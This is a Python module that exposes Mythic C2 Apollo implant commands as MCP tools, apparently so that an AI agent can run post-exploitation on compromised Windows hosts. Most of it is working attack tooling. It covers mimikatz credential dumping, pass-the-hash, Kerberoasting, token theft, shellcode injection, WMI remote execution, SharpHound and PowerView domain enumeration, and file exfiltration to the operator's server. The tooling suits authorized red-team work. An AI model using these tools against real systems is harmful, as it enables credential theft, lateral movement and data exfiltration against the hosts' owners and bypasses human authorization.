"""Apollo post-exploitation tasking tools for the Mythic MCP server.

This module is registered onto ``observation.py``'s FastMCP instance only when the
``apollo`` capability flag is on. Everything here issues tasks against Apollo
callbacks — these are the tools that cause an implant to run commands on a
target host, so they sit behind the explicit operator opt-in.

Call :func:`register` with the FastMCP instance to attach all tools. Inter-
tool orchestration (``powershell_script``, ``sharphound_and_download``,
``powerview``, etc.) uses the module-level functions directly so it does not
round-trip through MCP.
"""

from __future__ import annotations

import os
import tempfile
from pathlib import Path
from typing import Annotated, Any
from uuid import uuid4

from fastmcp import FastMCP
from mythic import mythic as mythic_sdk

from .mythic_api import current_config, ensure_connected, truncate


TEMP_DIR = Path("/tmp/mythic-c2")  # noqa: S108 - scoped to this server

MYTHIC_DATA_DIR = Path(
    os.environ.get("MYTHIC_DATA_DIR") or (Path(__file__).resolve().parent.parent / "data" / "mythic")
)


# ── Core task execution ─────────────────────────────────────────────


async def _execute(
    callback_display_id: int,
    command: str,
    args: dict[str, Any] | str,
    timeout: int | None = None,
) -> str:
    """Issue one Apollo command against a callback and return its output.

    Raises ``RuntimeError`` on transport / auth failure so FastMCP can surface
    it to the caller as a tool-call error. A successful task that produced no
    output returns a short "no output" message rather than raising — that is
    a valid command result, not a failure.
    """
    client = await ensure_connected()
    cfg = current_config()
    effective_timeout = timeout if timeout is not None else cfg["timeout"]
    try:
        output_bytes = await mythic_sdk.issue_task_and_waitfor_task_output(
            mythic=client,
            command_name=command,
            parameters=args,
            callback_display_id=callback_display_id,
            timeout=effective_timeout,
        )
    except Exception as exc:
        raise RuntimeError(f"Failed to execute '{command}' on callback {callback_display_id}: {exc}") from exc

    if not output_bytes:
        return f"Command '{command}' returned no output."

    text = str(output_bytes.decode() if isinstance(output_bytes, bytes) else output_bytes)
    text = truncate(text)

    if command == "execute_assembly" and "is not loaded (have you registered it?" in text:
        return f"{text}\n\nTry 'register_assembly' first, then retry execute_assembly."
    return text


async def execute(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    command: Annotated[
        str,
        "Apollo command name (e.g. shell, dcsync, socks, link, ppid, blockdlls, inject, screenshot)",
    ],
    arguments: Annotated[str | dict, "Command arguments — string or dict depending on the command"] = "",
    timeout: Annotated[int | None, "Command timeout (seconds)"] = None,
) -> str:
    """Execute any Apollo command by name. Use for commands without a dedicated tool."""
    return await _execute(callback_display_id, command, arguments, timeout)


# ── Mythic server-side file operations ──────────────────────────────
#
# "Staging" = placing a file on the Mythic server so an Apollo command can
# reference it by file_id. These tools manipulate the Mythic-side file store
# only; they do not task any implant. "Local" here always means the MCP
# server's filesystem (where this process runs).


async def stage_file(
    filepath: Annotated[str, "Path to the file on the MCP server's local filesystem"],
    reupload: Annotated[bool, "Re-stage even if a file with this name is already on Mythic"] = True,
) -> dict[str, Any]:
    """Place a local file on the Mythic server for later agent use.

    Reads from the MCP server's local filesystem and writes to Mythic's
    file store. The returned ``file_id`` is what Apollo commands reference
    (for example ``upload``, ``shinject``, ``powershell_import``).

    Returns:
        Dict with ``filename`` and ``file_id``.
    """
    client = await ensure_connected()
    filename = Path(filepath).name
    if not reupload:
        try:
            existing = await check_staged_file(filename=filename)
            return {"filename": filename, "file_id": existing["agent_file_id"]}
        except FileNotFoundError:
            pass
    contents = Path(filepath).read_bytes()
    file_id = await mythic_sdk.register_file(mythic=client, filename=filename, contents=contents)
    return {"filename": filename, "file_id": file_id}


async def check_staged_file(
    filename: Annotated[str, "Filename to look up on the Mythic server"],
) -> dict[str, Any]:
    """Look up a previously-staged file on the Mythic server by name.

    Raises ``FileNotFoundError`` when no matching (non-deleted) upload exists.

    Returns:
        Dict with ``agent_file_id``, ``filename_utf8``, ``timestamp``,
        ``sha1``, ``md5``, ``complete``.
    """
    client = await ensure_connected()
    attrs = "agent_file_id,filename_utf8,timestamp,deleted,is_download_from_agent," "sha1,md5,complete"
    async for batch in mythic_sdk.get_all_uploaded_files(mythic=client, custom_return_attributes=attrs, batch_size=50):
        for record in batch:
            if record["filename_utf8"] == filename and not record["deleted"]:
                return record
    raise FileNotFoundError(f"File '{filename}' not found on Mythic server.")


async def fetch_staged_file(
    filename: Annotated[str, "Name of the file on the Mythic server to pull"],
) -> dict[str, Any]:
    """Pull a file from Mythic's agent-downloaded store to the MCP server's local disk.

    Writes to ``/tmp/mythic-c2/<filename>`` — an existing file at that path
    is overwritten. Raises ``FileNotFoundError`` when no matching file
    exists on Mythic.

    Returns:
        Dict with ``name``, ``path``, and ``size_bytes`` of the saved local file.
    """
    client = await ensure_connected()
    file_uuid: str | None = None
    async for batch in mythic_sdk.get_all_downloaded_files(
        mythic=client,
        custom_return_attributes="agent_file_id,filename_utf8,is_download_from_agent",
        batch_size=50,
    ):
        for f in batch:
            if f["filename_utf8"] == filename:
                file_uuid = f["agent_file_id"]
                break
        if file_uuid:
            break
    if file_uuid is None:
        raise FileNotFoundError(f"File '{filename}' not found on Mythic server.")
    data = await mythic_sdk.download_file(mythic=client, file_uuid=file_uuid)
    TEMP_DIR.mkdir(parents=True, exist_ok=True)
    path = TEMP_DIR / filename
    path.write_bytes(data)
    return {"name": filename, "path": str(path), "size_bytes": len(data)}


# ── Apollo implant tools ────────────────────────────────────────────


async def adcollector(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Enumerate the current AD domain environment via ADCollector.exe."""
    return await _execute(callback_display_id, command="execute_assembly", args="ADCollector.exe")


async def adsearch(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Query AD for domain objects via ADSearch.exe."""
    return await _execute(callback_display_id, command="execute_assembly", args="ADSearch.exe")


async def cat(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    path: Annotated[str, "Path of the file to read on the target"],
) -> str:
    """Read the contents of a file at the specified path."""
    return await _execute(callback_display_id, command="cat", args=path)


async def cd(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    path: Annotated[str, "Path to change into"],
) -> str:
    """Change the agent's working directory."""
    return await _execute(callback_display_id, command="cd", args=path)


async def cp(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    source: Annotated[str, "Source path on the target"],
    destination: Annotated[str, "Destination path on the target"],
) -> str:
    """Copy a file from source to destination on the target system."""
    return await _execute(
        callback_display_id,
        command="cp",
        args={"source": source, "destination": destination},
    )


async def download(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    path: Annotated[str, "Full path of the file on the target to download"],
) -> str:
    """Download a file from the target back to the Mythic server."""
    return await _execute(callback_display_id, command="download", args=path)


async def download_and_fetch(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    path: Annotated[str, "Full path of the file on the target to exfiltrate"],
) -> dict[str, Any]:
    """Task the agent to exfiltrate a file, then pull it to the MCP server's local disk.

    Chains the Apollo ``download`` command (target → Mythic) with a local
    retrieve (Mythic → MCP server). Each call writes to a fresh temp dir so
    repeated pulls of the same basename don't collide.

    Returns:
        Dict with ``name``, ``path``, and ``size_bytes`` of the saved local file.
    """
    download_result = await download(callback_display_id=callback_display_id, path=path)
    if "does not exist." in download_result:
        raise RuntimeError(f"Target has no such file: {download_result}")

    client = await ensure_connected()
    file_uuid: str | None = None
    async for batch in mythic_sdk.get_all_downloaded_files(
        mythic=client,
        custom_return_attributes="agent_file_id,filename_utf8,is_download_from_agent",
        batch_size=50,
    ):
        for f in batch:
            if f["filename_utf8"] == path:
                file_uuid = f["agent_file_id"]
                break
        if file_uuid:
            break
    if file_uuid is None:
        raise FileNotFoundError(f"'{path}' not found on Mythic server after download.")
    fbytes = await mythic_sdk.download_file(mythic=client, file_uuid=file_uuid)
    if not fbytes:
        raise RuntimeError(f"'{path}' downloaded from Mythic as empty bytes.")

    filename = Path(path).name if "\\" not in path else path.split("\\")[-1]
    tmp_dir = tempfile.mkdtemp()
    tmp_path = os.path.join(tmp_dir, filename)
    with open(tmp_path, "wb") as f:
        f.write(fbytes)
    return {"name": filename, "path": tmp_path, "size_bytes": len(fbytes)}


async def getprivs(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Enable all possible privileges on the current access token."""
    return await _execute(callback_display_id, command="getprivs", args="")


async def ifconfig(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """List network interfaces and their configuration on the target."""
    return await _execute(callback_display_id, command="ifconfig", args="")


async def jobkill(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    jid: Annotated[int, "Job identifier to terminate"],
) -> str:
    """Terminate a background job by its job id."""
    return await _execute(callback_display_id, command="jobkill", args=str(jid))


async def jobs(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """List currently active background jobs on the agent."""
    return await _execute(callback_display_id, command="jobs", args="")


async def ls(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    path: Annotated[str | None, "Path to list (defaults to the agent's current directory)"] = None,
) -> str:
    """List files and folders in a directory."""
    args: dict[str, str] | str = {"path": path} if path else ""
    return await _execute(callback_display_id, command="ls", args=args)


async def make_token(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    username: Annotated[str, "Username for the new logon session"],
    password: Annotated[str, "Password for the specified user"],
    netonly: Annotated[bool, "True → network-only token; False → interactive"] = False,
) -> str:
    """Create a new logon session using the supplied credentials."""
    return await _execute(
        callback_display_id,
        command="make_token",
        args={"username": username, "password": password, "netOnly": str(netonly)},
    )


async def mimikatz(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    commands: Annotated[str, "Space-separated mimikatz commands (e.g. 'sekurlsa::logonpasswords')"],
) -> str:
    """Execute one or more mimikatz commands via its reflective library."""
    return await _execute(callback_display_id, command="mimikatz", args=commands)


async def net_dclist(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    domain: Annotated[str, "Target domain (required)"],
) -> str:
    """Get domain controllers belonging to a domain."""
    if not domain:
        raise ValueError("domain is required")
    return await _execute(callback_display_id, command="net_dclist", args=domain)


async def net_localgroup(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    computer: Annotated[str, "Target computer (defaults to localhost)"] = "localhost",
) -> str:
    """List local groups on the specified computer."""
    return await _execute(
        callback_display_id,
        command="net_localgroup",
        args=computer or "localhost",
    )


async def net_localgroup_member(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    group: Annotated[str, "Target group name"],
    computer: Annotated[str, "Target computer"] = "localhost",
) -> str:
    """List members of a local group on the specified computer."""
    return await _execute(
        callback_display_id,
        command="net_localgroup_member",
        args={"computer": computer, "group": group},
    )


async def net_shares(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    computer: Annotated[str, "Target computer"] = "localhost",
) -> str:
    """List network shares available on the specified computer."""
    return await _execute(callback_display_id, command="net_shares", args=computer)


async def netstat(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    listen: Annotated[bool, "List ports in listening state"] = True,
    established: Annotated[bool, "List ports in established state"] = True,
    tcp: Annotated[bool, "Include TCP"] = True,
    udp: Annotated[bool, "Include UDP"] = True,
) -> str:
    """Display active TCP/UDP connections and listening ports."""
    return await _execute(
        callback_display_id,
        command="netstat",
        args={
            "listen": str(listen).lower(),
            "established": str(established).lower(),
            "tcp": str(tcp).lower(),
            "udp": str(udp).lower(),
        },
    )


async def powerpick(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    arguments: Annotated[str, "PowerShell command or script block to execute"],
) -> str:
    """Inject a PowerShell loader into a sacrificial process and execute."""
    return await _execute(callback_display_id, command="powerpick", args=arguments)


async def powershell(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    arguments: Annotated[str, "PowerShell arguments to execute"],
    timeout: Annotated[int, "Timeout (seconds)"] = 30,
) -> str:
    """Execute PowerShell in the current PowerShell instance on the agent."""
    return await _execute(callback_display_id, command="powershell", args=arguments, timeout=timeout)


async def powershell_import(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    filename: Annotated[str, ".ps1 file to register in Apollo"],
) -> str:
    """Register a PowerShell script file for subsequent powershell/powerpick calls."""
    return await _execute(
        callback_display_id,
        command="powershell_import",
        args={"existingFile": filename},
        timeout=60,
    )


async def powershell_script(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    entry_function: Annotated[str, "Entry function name to invoke"],
    filepath: Annotated[str | None, "Local .ps1 path (filepath or script is required)"] = None,
    script: Annotated[str | None, "Raw PowerShell source (filepath or script is required)"] = None,
    args: Annotated[str, "Arguments to pass to the entry function"] = "",
    reupload: Annotated[bool, "Re-upload if already staged on Mythic"] = True,
) -> str:
    """Upload a PowerShell script to Mythic, import it, and invoke the entry function."""
    if not filepath and not script:
        raise ValueError("either 'filepath' or 'script' must be provided")

    tmp_path: str | None = None
    if script is not None:
        filename = f"pwsh_script_{uuid4().hex[:8]}.ps1"
        tmp_dir = tempfile.mkdtemp()
        tmp_path = os.path.join(tmp_dir, filename)
        with open(tmp_path, "w") as f:
            f.write(script)
        filepath = tmp_path
    else:
        assert filepath is not None
        filename = Path(filepath).name

    try:
        upload_result = await stage_file(filepath=filepath, reupload=reupload)
    finally:
        if tmp_path is not None:
            try:
                os.unlink(tmp_path)
            except OSError:
                pass

    if upload_result.get("file_id") is None:
        raise RuntimeError("powershell_script upload to Mythic failed")

    pi_result = await powershell_import(callback_display_id=callback_display_id, filename=filename)
    if "will now be imported in PowerShell commands" not in pi_result:
        raise RuntimeError(f"powershell_import failed: {pi_result}")
    return await powershell(
        callback_display_id=callback_display_id,
        arguments=f"{entry_function} {args}",
    )


async def powerview(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    command: Annotated[str, "PowerView command line"],
    credential_user: Annotated[str | None, "(optional) domain user"] = None,
    credential_password: Annotated[str | None, "(optional) password"] = None,
    domain: Annotated[str | None, "(optional) domain"] = None,
) -> str:
    """Auto-upload PowerView.ps1, import it, and run the requested command."""
    script = "PowerView.ps1"
    upload_result = await stage_file(filepath=str(MYTHIC_DATA_DIR / script), reupload=False)
    if upload_result.get("file_id") is None:
        raise RuntimeError(f"failed to upload {script} from {MYTHIC_DATA_DIR}")

    pi_result = await powershell_import(callback_display_id=callback_display_id, filename=upload_result["filename"])
    if "will now be imported in PowerShell commands" not in pi_result:
        raise RuntimeError(f"powerview import failed: {pi_result}")

    powerview_cmd = command
    if credential_user and credential_password and domain:
        powerview_cmd = (
            f"{powerview_cmd} -Credential (New-Object -TypeName "
            "'System.Management.Automation.PSCredential' -ArgumentList "
            f"'{domain}\\{credential_user}', (ConvertTo-SecureString -String "
            f"'{credential_password}' -AsPlainText -Force))"
        )
    return await powershell(callback_display_id=callback_display_id, arguments=powerview_cmd)


async def pth(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    domain: Annotated[str, "Target domain"],
    username: Annotated[str, "Username to authenticate as"],
    ntlm_hash: Annotated[str, "NTLM hash of the user's password"],
) -> str:
    """Authenticate via Pass-the-Hash using the supplied NTLM hash."""
    return await _execute(
        callback_display_id,
        command="pth",
        args={"domain": domain, "user": username, "ntlm": ntlm_hash},
    )


async def ps(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """List running processes on the target."""
    return await _execute(callback_display_id, command="ps", args="")


async def pwd(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Print the agent's current working directory."""
    return await _execute(callback_display_id, command="pwd", args="")


async def reg_query(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    key: Annotated[str, "Full registry key path"],
) -> str:
    """Query values and subkeys under a registry key."""
    return await _execute(callback_display_id, command="reg_query", args=key)


async def register_assembly(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    filename: Annotated[str, "Assembly file to register"],
) -> str:
    """Register an assembly file/command on the Apollo agent."""
    return await _execute(
        callback_display_id,
        command="register_assembly",
        args={"existingFile": filename},
    )


async def rev2self(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Revert the agent's impersonation state to its primary token."""
    return await _execute(callback_display_id, command="rev2self", args="")


async def rubeus_asreproast(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Run Rubeus ASREP-Roast against the current domain."""
    return await _execute(
        callback_display_id,
        command="execute_assembly",
        args="Rubeus.exe asreproast /format:hashcat",
    )


async def rubeus_kerberoast(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    cred_user: Annotated[str, "Principal domain user ('DOMAIN\\\\user')"],
    cred_password: Annotated[str, "Password for the principal user"],
    user: Annotated[str | None, "(optional) specific user to target"] = None,
    spn: Annotated[str | None, "(optional) specific SPN to target"] = None,
) -> str:
    """Run Rubeus Kerberoast against the current domain."""
    args = f"Rubeus.exe kerberoast /creduser:{cred_user} " f"/credpassword:{cred_password} /format:hashcat"
    if user is not None:
        args += f" /user:{user}"
    if spn is not None:
        args += f" /spn:{spn}"
    return await _execute(callback_display_id, command="execute_assembly", args=args)


async def seatbelt(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    group: Annotated[str, "Group flag: 'all' or 'system'"] = "all",
) -> str:
    """Run Seatbelt host-survey safety checks."""
    return await _execute(
        callback_display_id,
        command="execute_assembly",
        args=f'Seatbelt.exe "-group={group}"',
    )


async def set_injection_technique(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    technique: Annotated[str, "Injection technique (e.g. 'CreateRemoteThread', 'NtCreateThreadEx')"],
) -> str:
    """Set the default process injection technique for subsequent commands."""
    return await _execute(callback_display_id, command="set_injection_technique", args=technique)


async def setspn(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    args: Annotated[str, "Arguments for setspn"],
) -> str:
    """Read/modify/delete SPN directory properties for an AD account."""
    return await _execute(
        callback_display_id,
        command="powershell",
        args=f"($sspn = setspn {args}); echo $sspn",
    )


async def sharphound_and_download(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    domain: Annotated[str, "Domain to enumerate"],
    ldap_username: Annotated[str | None, "(optional) LDAP user"] = None,
    ldap_password: Annotated[str | None, "(optional) LDAP password"] = None,
    local_filename: Annotated[str | None, "(optional) rename the result locally"] = None,
) -> dict[str, Any]:
    """Run SharpHound on the callback, then download the resulting zip locally."""
    upload_result = await stage_file(
        filepath=str(MYTHIC_DATA_DIR / "sharphound-v2.6.7" / "SharpHound.ps1"),
        reupload=False,
    )
    if upload_result.get("file_id") is None:
        raise RuntimeError("failed to upload SharpHound.ps1 to Mythic")

    pi_result = await powershell_import(
        callback_display_id=callback_display_id,
        filename=upload_result["filename"],
    )
    if "will now be imported in PowerShell commands" not in pi_result:
        raise RuntimeError(f"sharphound import failed: {pi_result}")

    zip_marker = f"{uuid4()!s}.zip"
    sharp_cmd = f"Invoke-BloodHound -Zipfilename {zip_marker} -Domain {domain}"
    if ldap_username and ldap_password:
        sharp_cmd += f" --ldapusername {ldap_username} --ldappassword {ldap_password}"

    sharphound_result = await powershell(callback_display_id=callback_display_id, arguments=sharp_cmd, timeout=120)
    if "SharpHound Enumeration Completed" not in sharphound_result:
        raise RuntimeError(f"SharpHound run failed: {sharphound_result}")

    locate_result = await powershell(
        callback_display_id=callback_display_id,
        arguments=f"(Get-ChildItem -Path .\\ -Filter '*{zip_marker}').name",
    )
    if zip_marker not in locate_result:
        raise RuntimeError(f"could not locate SharpHound output: {locate_result}")

    output_filename = locate_result.strip("\r\n").split("\r\n")[-1]
    local = await download_and_fetch(callback_display_id=callback_display_id, path=output_filename)

    if local_filename:
        os.rename(local["path"], local_filename)
        local["path"] = os.path.abspath(local_filename)
        local["name"] = os.path.basename(local["path"])
    return local


async def shinject(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    pid: Annotated[int, "Target process PID"],
    shellcode_filepath: Annotated[str, "Local shellcode file path"],
) -> str:
    """Inject raw shellcode into a remote process."""
    upload_result = await stage_file(filepath=shellcode_filepath, reupload=True)
    if upload_result.get("file_id") is None:
        raise RuntimeError("shellcode upload to Mythic failed")
    return await _execute(
        callback_display_id,
        command="shinject",
        args={"pid": pid, "shellcode_file_id": upload_result["file_id"]},
    )


async def spawnto_x64(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    application: Annotated[str, "Full path to 64-bit sacrificial executable"],
    args: Annotated[str | None, "(optional) command-line args"] = "",
) -> str:
    """Set the default 64-bit sacrificial executable for injection-spawn targets."""
    return await _execute(
        callback_display_id,
        command="spawnto_x64",
        args={"application": application, "arguments": args},
    )


async def steal_token(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    pid: Annotated[int, "Target process PID to steal the token from"],
) -> str:
    """Impersonate the primary access token of another process by PID."""
    return await _execute(callback_display_id, command="steal_token", args=str(pid))


async def upload(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    filepath: Annotated[str, "Local file to stage on Mythic then deliver to target"],
    target_host_path: Annotated[str, "Destination path on the target host"],
) -> str:
    """Upload a local file all the way to a target host via Mythic."""
    staged = await stage_file(filepath=filepath, reupload=True)
    if staged.get("file_id") is None:
        raise RuntimeError(f"could not stage '{filepath}' on the Mythic server")
    return await _execute(
        callback_display_id,
        command="upload",
        args={"remote_path": target_host_path, "file": staged["file_id"]},
    )


async def whoami(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
) -> str:
    """Display the agent's current security context (impersonated or primary token)."""
    return await _execute(callback_display_id, command="whoami", args="")


async def wmiexecute(
    callback_display_id: Annotated[int, "Apollo callback display ID"],
    command: Annotated[str, "Full command to execute"],
    host: Annotated[str, "Remote computer to target"],
    username: Annotated[str, "Account username"],
    password: Annotated[str, "Account password"],
    domain: Annotated[str, "Domain of the account"],
) -> str:
    """Execute a command on a remote system via WMI."""
    return await _execute(
        callback_display_id,
        command="wmiexecute",
        args={
            "command": command,
            "host": host,
            "username": username,
            "password": password,
            "domain": domain,
        },
    )


# ── Registration ────────────────────────────────────────────────────


_TOOLS = (
    execute,
    stage_file,
    check_staged_file,
    fetch_staged_file,
    adcollector,
    adsearch,
    cat,
    cd,
    cp,
    download,
    download_and_fetch,
    getprivs,
    ifconfig,
    jobkill,
    jobs,
    ls,
    make_token,
    mimikatz,
    net_dclist,
    net_localgroup,
    net_localgroup_member,
    net_shares,
    netstat,
    powerpick,
    powershell,
    powershell_import,
    powershell_script,
    powerview,
    pth,
    ps,
    pwd,
    reg_query,
    register_assembly,
    rev2self,
    rubeus_asreproast,
    rubeus_kerberoast,
    seatbelt,
    set_injection_technique,
    setspn,
    sharphound_and_download,
    shinject,
    spawnto_x64,
    steal_token,
    upload,
    whoami,
    wmiexecute,
)


def register(mcp: FastMCP) -> None:
    """Register every Apollo tool onto the provided FastMCP instance."""
    for fn in _TOOLS:
        mcp.tool(fn)
